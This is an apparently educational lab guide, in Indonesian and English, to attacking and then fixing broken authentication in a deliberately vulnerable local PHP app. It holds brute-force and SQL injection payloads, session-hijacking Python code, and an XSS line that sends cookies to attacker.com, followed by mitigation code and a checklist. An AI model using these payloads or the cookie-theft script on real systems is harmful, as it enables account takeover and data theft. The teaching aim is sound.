# 🔓 Broken Authentication Attack Scenarios & Vulnerability Analysis

> **📚 Educational Resource**: Panduan komprehensif untuk memahami dan menguji vulnerability authentication  
> **⚠️ Disclaimer**: Hanya untuk tujuan pembelajaran dan testing pada sistem yang diotorisasi  
> **📅 Updated**: 22 September 2025

---

## 📋 Daftar Isi

1. [Overview Aplikasi Vulnerable](#1-overview-aplikasi-vulnerable)
2. [Attack Scenario 1: Brute Force Attack](#2-attack-scenario-1-brute-force-attack)
3. [Attack Scenario 2: Session Hijacking](#3-attack-scenario-2-session-hijacking)
4. [Attack Scenario 3: SQL Injection](#4-attack-scenario-3-sql-injection)
5. [Attack Scenario 4: Session Fixation](#5-attack-scenario-4-session-fixation)
6. [Tools & Scripts](#6-tools--scripts)
7. [Mitigation Strategies](#7-mitigation-strategies)

---

## 1. Overview Aplikasi Vulnerable

### 🎯 **Target Application**
- **URL**: http://localhost:8081
- **Technology Stack**: PHP 8.1, MySQL 8.0, Apache, Redis
- **Purpose**: Educational - Intentionally vulnerable for security testing

### 🚨 **Identified Vulnerabilities**

| ID | Vulnerability | Severity | OWASP Category |
|----|---------------|----------|----------------|
| V1 | No Rate Limiting | 🔴 High | A07:2021 - Identification and Authentication Failures |
| V2 | Plain Text Passwords | 🔴 High | A02:2021 - Cryptographic Failures |
| V3 | SQL Injection | 🔴 High | A03:2021 - Injection |
| V4 | Insecure Session Management | 🔴 High | A07:2021 - Identification and Authentication Failures |
| V5 | Session Fixation | 🟡 Medium | A07:2021 - Identification and Authentication Failures |
| V6 | Missing Security Headers | 🟡 Medium | A05:2021 - Security Misconfiguration |

---

## 2. Attack Scenario 1: Brute Force Attack

### 🎯 **Objective**
Mendapatkan akses ke akun dengan mencoba kombinasi username/password secara otomatis

### 🔍 **Vulnerability Analysis**
```php
// Di index.php - Tidak ada rate limiting
if ($_POST && isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Vulnerability: No rate limiting mechanism
    $user = getUserByUsername($username);
    
    if ($user) {
        // Vulnerability: Plain text password comparison
        if ($user['password'] === $password) {
            // Login berhasil
        }
    }
}
```

**🚨 Kerentanan:**
- Tidak ada pembatasan jumlah percobaan login
- Tidak ada delay antara percobaan
- Tidak ada account lockout
- Password disimpan dalam plain text

### 🛠️ **Tools Required**
- Python 3.x
- `requests` library
- `attack_testing_suite.py` script

### 📝 **Step-by-Step Attack**

#### **Step 1: Reconnaissance**
```bash
# Identifikasi target dan form login
curl -s http://localhost:8081 | grep -i "form"
```

#### **Step 2: Prepare Attack**
```python
# Username list (common usernames)
usernames = ['admin', 'administrator', 'john', 'jane', 'bob', 'charlie']

# Password list (weak passwords dari aplikasi)
passwords = ['admin', 'password', '123456', 'qwerty', 'password123']
```

#### **Step 3: Execute Brute Force**
```bash
# Jalankan script otomatis
python3 attack_testing_suite.py
```

**Manual Testing:**
```bash
# Test single credential
curl -X POST http://localhost:8081/index.php \
  -d "username=admin&password=admin" \
  -b cookies.txt -c cookies.txt

# Look for success indicators
grep -i "login successful\|welcome" response.html
```

#### **Step 4: Analyze Results**
- **Success Indicator**: "Login successful" dalam response
- **Failed Indicator**: "Invalid credentials"
- **No Rate Limiting**: Tidak ada delay atau blocking

### 📊 **Expected Results**
```
✅ Successful Credentials Found:
   • admin:admin
   • john:password  
   • jane:123456
   • bob:qwerty
   • charlie:password123

⏱️ Total Time: ~30 seconds for 30 attempts
🔢 Success Rate: 5/30 (16.7%)
```

### 💡 **Detection Methods**
- Monitor login attempt frequency
- Track failed login patterns
- Watch for unusual source IPs

---

## 3. Attack Scenario 2: Session Hijacking

### 🎯 **Objective**
Mengambil alih session user yang sudah login untuk mengakses akun mereka

### 🔍 **Vulnerability Analysis**
```php
// Di config.php - Insecure session settings
ini_set('session.cookie_httponly', 0); // JS dapat akses cookie
ini_set('session.cookie_secure', 0);   // Tidak perlu HTTPS
ini_set('session.use_strict_mode', 0); // Accept any session ID
```

**🚨 Kerentanan:**
- Cookie tidak memiliki `HttpOnly` flag
- Cookie tidak memiliki `Secure` flag  
- Session ID exposed di JavaScript
- Tidak ada session regeneration setelah login

### 🛠️ **Tools Required**
- Browser Developer Tools
- Python requests
- `session_hijacking_demo.py` script

### 📝 **Step-by-Step Attack**

#### **Step 1: Victim Analysis**
```javascript
// Di browser console (F12)
console.log(document.cookie);
// Output: PHPSESSID=5bdff63200ce6e32c12224e4a19568f9
```

#### **Step 2: Cookie Interception**
```bash
# Method 1: Network interception (if HTTP)
tcpdump -A -s 0 'tcp port 8081 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# Method 2: XSS payload (jika ada XSS)
<script>
fetch('http://attacker.com/steal.php?cookie=' + document.cookie);
</script>
```

#### **Step 3: Session Hijacking**
```python
import requests

# Attacker menggunakan session ID korban
victim_session_id = "5bdff63200ce6e32c12224e4a19568f9"

# Buat session baru dengan session ID korban
hijacker_session = requests.Session()
hijacker_session.cookies.set('PHPSESSID', victim_session_id)

# Akses halaman protected
response = hijacker_session.get('http://localhost:8081/profile.php')

if "profile" in response.text.lower():
    print("🚨 HIJACK SUCCESSFUL!")
```

#### **Step 4: Privilege Escalation**
```python
# Coba akses admin panel
admin_response = hijacker_session.get('http://localhost:8081/admin.php')
if admin_response.status_code == 200:
    print("🔴 ADMIN ACCESS GAINED!")
```

### 📊 **Impact Assessment**
- **Account Takeover**: Complete access to victim's account
- **Data Exposure**: Access to personal information
- **Privilege Escalation**: Possible admin access
- **Persistent Access**: Session remains valid until logout/timeout

---

## 4. Attack Scenario 3: SQL Injection

### 🎯 **Objective**
Bypass authentication atau extract data melalui SQL injection vulnerability

### 🔍 **Vulnerability Analysis**
```php
// Potential vulnerability in getUserByUsername function
function getUserByUsername($username) {
    global $pdo;
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$username]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}
```

**🚨 Discovery:**
Meskipun fungsi `getUserByUsername` menggunakan prepared statements, error handling yang buruk mengekspos database errors.

### 🛠️ **Tools Required**
- cURL atau Python requests
- SQL injection payloads
- `sql_injection_tester.py` script

### 📝 **Step-by-Step Attack**

#### **Step 1: Error Discovery**
```bash
# Test basic SQL injection payload
curl -X POST http://localhost:8081/index.php \
  -d "username=admin'--&password=anything"
```

**Response mengungkap:**
```
Fatal error: Uncaught PDOException: SQLSTATE[HY000]: General error: 1366 
Incorrect integer value: '' for column 'success' at row 1 in /var/www/html/config.php:28
```

#### **Step 2: Information Gathering**
```bash
# Database type identification
curl -X POST http://localhost:8081/index.php \
  -d "username=admin' AND (SELECT COUNT(*) FROM information_schema.tables)>0--&password=test"
```

#### **Step 3: Authentication Bypass Attempts**
```sql
-- Payload 1: Comment injection
admin'--

-- Payload 2: Boolean bypass
' OR '1'='1'--

-- Payload 3: Union injection
' UNION SELECT 1,'admin','password',1--
```

#### **Step 4: Data Extraction**
```sql
-- Extract database version
' UNION SELECT 1,version(),user(),1--

-- Extract table names
' UNION SELECT 1,table_name,2,3 FROM information_schema.tables--

-- Extract user data
' UNION SELECT 1,username,password,role FROM users--
```

### 📊 **Vulnerability Impact**
- **Authentication Bypass**: Possible with certain payloads
- **Data Extraction**: User credentials, database structure
- **Database Error Disclosure**: Technology stack revealed
- **Potential Data Modification**: INSERT, UPDATE, DELETE operations

---

## 5. Attack Scenario 4: Session Fixation

### 🎯 **Objective**
Menetapkan session ID yang dikendalikan attacker untuk korban

### 🔍 **Vulnerability Analysis**
```php
// Di index.php - Session fixation vulnerability (broken implementation)
if (isset($_GET['sessionid'])) {
    session_id($_GET['sessionid']); // Vulnerable: Allows session fixation
    session_start();
}
```

**🚨 Implementation Issue:**
Vulnerability ini tidak berfungsi karena `config.php` sudah memanggil `session_start()` sebelumnya.

### 📝 **Step-by-Step Attack (Theoretical)**

#### **Step 1: Attacker Preparation**
```
http://localhost:8081?sessionid=ATTACKER_CONTROLLED_SESSION
```

#### **Step 2: Victim Interaction**
1. Attacker mengirim link ke korban
2. Korban mengklik link dan login
3. Server menggunakan session ID yang ditetapkan attacker

#### **Step 3: Session Hijacking**
```python
# Attacker menggunakan session ID yang sudah ditetapkan
known_session_id = "ATTACKER_CONTROLLED_SESSION"
attacker_session = requests.Session()
attacker_session.cookies.set('PHPSESSID', known_session_id)
```

### 🛠️ **Current Status**
```bash
# Testing menghasilkan error:
curl "http://localhost:8081?sessionid=ATTACKER_SESSION"

# Output:
Warning: session_id(): Session ID cannot be changed when a session is active
Notice: session_start(): Ignoring session_start() because a session is already active
```

---

## 6. Tools & Scripts

### 🐍 **Python Testing Scripts**

#### **1. Comprehensive Attack Suite**
```bash
python3 attack_testing_suite.py
```
**Features:**
- Brute force testing
- Session security analysis  
- SQL injection testing
- Password reset testing
- Comprehensive reporting

#### **2. Session Hijacking Demo**
```bash
python3 session_hijacking_demo.py
```
**Features:**
- Cookie security analysis
- Session hijacking demonstration
- Session fixation testing

#### **3. SQL Injection Tester**
```bash
python3 sql_injection_tester.py
```
**Features:**
- Multiple injection techniques
- Error-based detection
- Blind injection testing
- Exploitation demonstration

### 🔧 **Manual Testing Commands**

#### **Brute Force Testing**
```bash
# Single credential test
curl -X POST http://localhost:8081/index.php -d "username=admin&password=admin" -c cookies.txt

# View response
grep -i "login successful\|welcome\|invalid" response.html
```

#### **Session Analysis**
```bash
# Get session cookie
curl -c cookies.txt http://localhost:8081

# View cookie details
cat cookies.txt

# Test session with different cookie
curl -b "PHPSESSID=custom_session_id" http://localhost:8081/profile.php
```

#### **SQL Injection Testing**
```bash
# Basic error testing
curl -X POST http://localhost:8081/index.php -d "username=admin'&password=test"

# Authentication bypass
curl -X POST http://localhost:8081/index.php -d "username=admin'--&password=anything"
```

---

## 7. Mitigation Strategies

### 🛡️ **Immediate Security Fixes**

#### **1. Rate Limiting Implementation**
```php
// Add to login logic
$max_attempts = 5;
$lockout_time = 900; // 15 minutes

function checkRateLimit($username, $ip) {
    global $pdo, $max_attempts, $lockout_time;
    
    $stmt = $pdo->prepare("
        SELECT COUNT(*) as attempts 
        FROM login_attempts 
        WHERE (username = ? OR ip_address = ?) 
        AND success = 0 
        AND created_at > DATE_SUB(NOW(), INTERVAL ? SECOND)
    ");
    $stmt->execute([$username, $ip, $lockout_time]);
    $result = $stmt->fetch();
    
    return $result['attempts'] < $max_attempts;
}
```

#### **2. Secure Session Configuration**
```php
// Secure session settings
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.use_strict_mode', 1);
ini_set('session.cookie_samesite', 'Strict');
ini_set('session.gc_maxlifetime', 3600);

// Regenerate session ID after login
session_regenerate_id(true);
```

#### **3. Password Security**
```php
// Use password hashing
function hashPassword($password) {
    return password_hash($password, PASSWORD_ARGON2ID);
}

function verifyPassword($password, $hash) {
    return password_verify($password, $hash);
}
```

#### **4. SQL Injection Prevention**
```php
// Always use prepared statements (already implemented)
// Add input validation
function validateInput($input, $type) {
    switch($type) {
        case 'username':
            return preg_match('/^[a-zA-Z0-9_]{3,20}$/', $input);
        case 'password':
            return strlen($input) >= 8;
        default:
            return false;
    }
}
```

### 🔒 **Advanced Security Measures**

#### **1. Multi-Factor Authentication**
```php
// Implement 2FA
function generateTOTP($secret) {
    // Use Google Authenticator compatible TOTP
    return time_based_otp($secret);
}
```

#### **2. Security Headers**
```php
// Add security headers
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
```

#### **3. Logging & Monitoring**
```php
// Enhanced logging
function logSecurityEvent($event_type, $details) {
    $log_entry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'event_type' => $event_type,
        'details' => $details
    ];
    
    file_put_contents('/var/log/security.log', json_encode($log_entry) . "\n", FILE_APPEND);
}
```

### 📋 **Security Checklist**

#### **Authentication Security**
- [ ] Implement rate limiting on login attempts
- [ ] Add account lockout mechanism
- [ ] Use strong password hashing (Argon2ID)
- [ ] Implement password complexity requirements
- [ ] Add multi-factor authentication
- [ ] Implement CAPTCHA for repeated failures

#### **Session Security**
- [ ] Set HttpOnly flag on session cookies
- [ ] Set Secure flag for HTTPS-only cookies
- [ ] Implement SameSite cookie attribute
- [ ] Regenerate session ID after authentication
- [ ] Implement proper session timeout
- [ ] Use cryptographically secure session ID generation

#### **Input Validation**
- [ ] Validate all user inputs
- [ ] Use parameterized queries (already implemented)
- [ ] Implement input sanitization
- [ ] Add output encoding
- [ ] Implement Content Security Policy

#### **Monitoring & Logging**
- [ ] Log all authentication attempts
- [ ] Monitor for brute force patterns
- [ ] Implement real-time alerting
- [ ] Add security event correlation
- [ ] Regular security log review

---

## 📚 References & Further Reading

- **OWASP Top 10 2021**: https://owasp.org/www-project-top-ten/
- **OWASP Authentication Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- **OWASP Session Management Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
- **PHP Security Guide**: https://www.php.net/manual/en/security.php

---

> **⚠️ Legal Disclaimer**: Semua informasi dan tools dalam dokumen ini hanya untuk tujuan educational dan authorized security testing. Penggunaan untuk tujuan ilegal atau tanpa otorisasi adalah tanggung jawab pengguna.

> **🎓 Educational Note**: Dokumen ini dibuat untuk membantu pemahaman tentang vulnerability authentication dan cara mitigasinya dalam konteks cybersecurity education.